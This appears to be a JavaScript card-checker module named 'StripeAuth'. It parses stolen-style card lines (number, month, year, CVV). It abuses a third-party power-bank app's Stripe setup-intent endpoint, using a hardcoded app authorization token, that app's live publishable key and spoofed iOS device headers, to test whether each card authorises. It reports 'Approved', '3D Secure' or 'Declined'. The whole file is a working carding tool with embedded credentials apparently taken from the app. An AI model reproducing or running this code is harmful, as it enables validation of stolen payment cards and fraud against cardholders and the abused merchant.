(function() {
    'use strict';

    window.StripeAuth = {
        formatCC: function(line) {
            try {
                const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
                if (parts.length < 4) return null;
                let cc = parts[0].replace(/\D/g, '');
                let mm = parts[1].replace(/\D/g, '');
                let yy = parts[2].replace(/\D/g, '');
                let cvv = parts[3].replace(/\D/g, '');
                if (mm.length === 1) mm = '0' + mm;
                else if (mm.length > 2) mm = mm.slice(-2);
                if (yy.length === 4) yy = yy.slice(-2);
                return { cc, mm, yy, cvv };
            } catch (e) { return null; }
        },

        check: async function(cc, mm, yy, cvv) {
            try {
                const urlCreate = 'https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent?language=ger';
                const headersCreate = {
                    'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
                    'Content-Type': 'application/json; charset=utf-8',
                    'Accept-Language': 'tr-TR,tr;q=0.9',
                    'Authorization': 'Possessor 1I1/xy0GbbDYwK5xkCXVxANB+NryBfyb17Wyqph2LyBehTPQ/2Za96UQi2CC3+NRDN2GCelfjjKXnxt77Bkp31OsHImCIVCedbXB+LCn8a2g4qQaLFFwSH3W9txaXhHJJcCZez1XzZ9Ceae+WoyjyLrjx/i3G20JUe+JalsAOcNqmv5bFrFXnWHK+0Cv5Me8xqTehJKekS1ykD6IbO6+s+k19WSiuTupXLT8ukPSUQc04IkDIOzoJVLFJRmrC+onZ7I6BWFWSaP27qddLdssE4plPAgdIiH6pCXbVDZCW2a+pQVA1IUiZAdYdLSLUA8/bG03JFuQ/WE/1axeUqujZCNzxpnvu30cN11LQCBjNtjuugBH7yOanNO9t9DIgGKmlabVUatpX3dEP+ceyimRkDIceHmLwUDVJpTVtqgYgIje6ELTniGXsCOY0i501fLFFocg9me6cSnn9eHPcFgXXbmuIpHUW6342fyxhai3pDCADyAEEGI6esi7GSxv2kIUX6q+5g/vDHR9Rn4v3HpWjXuCMs+wIw95+a4ZeEPBEaQ4uPeIFBAQ/4A9OmhWQV7gQ1f6BQnL8m8rFng8qr7O0/sqRo/PEutKWrBc6F19DyjJ4X7lhXIkoV8gFJmbcCfogwgkn/g15meQmm3Q6s+pmGqktTXoeeiZN6MZJSvwoHla/sqVnU3T6kymP5F+YexTNMuTahioNpe3Nw0xl4TbOwhPahPbxPZdg+o8SUsVTEma29DeGJpbm9yrQOBKxkXHtxSCQ8EsIWe/2YEGQoS/OSlvjPLAxjOdF1gZAvteSZym+ivBZPeOWO/oPnmynTHoY+fHBn1rzxI2qhtRYOpaxjJk4Y+VNdfRSiX9y4DPUdIBISgim4p30sYjNQxSnufXsJyDHEhuWxyr1Zc8oGRCeLX7omb/rkH8+361TFFHyAu4RPqJAnpWrPpFWe1nU99VvrE8cf7J94o01kalK9MmeDJiI+JuJ4+31cEQ4xtjJqlqgLfEZ1etNP1gIPl+Pfzx'
                };
                const respCreate = await fetch(urlCreate, {
                    method: 'POST',
                    headers: headersCreate,
                    body: JSON.stringify({})
                });
                const textCreate = await respCreate.text();
                const match = textCreate.match(/(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)/);
                if (!match) return 'Declined! (client_secret not found)';

                const clientSecret = match[1];
                const intentId = clientSecret.split('_secret_')[0];

                const urlConfirm = `https://api.stripe.com/v1/setup_intents/${intentId}/confirm`;
                const payload = new URLSearchParams();
                payload.append('client_secret', clientSecret);
                payload.append('expand[0]', 'payment_method');
                payload.append('payment_method_data[allow_redisplay]', 'unspecified');
                payload.append('payment_method_data[billing_details][address][country]', 'TR');
                payload.append('payment_method_data[card][cvc]', cvv);
                payload.append('payment_method_data[card][exp_month]', mm);
                payload.append('payment_method_data[card][exp_year]', yy);
                payload.append('payment_method_data[card][number]', cc);
                payload.append('payment_method_data[payment_user_agent]', 'stripe-ios/23.27.6; variant.legacy; PaymentSheet');
                payload.append('payment_method_data[type]', 'card');
                payload.append('use_stripe_sdk', 'true');

                const headersConfirm = {
                    'User-Agent': 'VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0',
                    'x-stripe-user-agent': '{"version":"0.37.3","url":"https:\\/\\/github.com\\/stripe\\/stripe-react-native","type":"iPad15,3","lang":"objective-c","name":"@stripe\\/stripe-react-native","bindings_version":"23.27.6","model":"iPad","vendor_identifier":"B0C09781-0D45-4FCD-BCD0-AE0A46B41CDC","os_version":"18.6","partner_id":""}',
                    'stripe-version': '2020-08-27',
                    'authorization': 'Bearer pk_live_51ONMPJCYEondzKCZD7N8xv2rgbCsyLOv2tEYGupao0fdROvY0DrlEZh1gUKuofYPBfD8NK35GGAV6t4OBMjHuIA200FTFfkaiy',
                    'accept-language': 'tr-TR,tr;q=0.9',
                    'Content-Type': 'application/x-www-form-urlencoded'
                };
                const respConfirm = await fetch(urlConfirm, {
                    method: 'POST',
                    headers: headersConfirm,
                    body: payload
                });
                const json = await respConfirm.json();

                if (json.error) {
                    const msg = json.error.message || 'Unknown error';
                    return 'Declined! (' + msg + ')';
                }
                const status = json.status;
                if (status === 'succeeded') return 'Approved! (AUTHED)';
                else if (status === 'requires_action' || status === 'requires_source_action') return '3D Secure! (3DS)';
                else return 'Declined! (UNKNOWN STATUS - ' + status + ')';
            } catch (err) {
                return 'Error: ' + err.message.slice(0, 50);
            }
        }
    };
})();
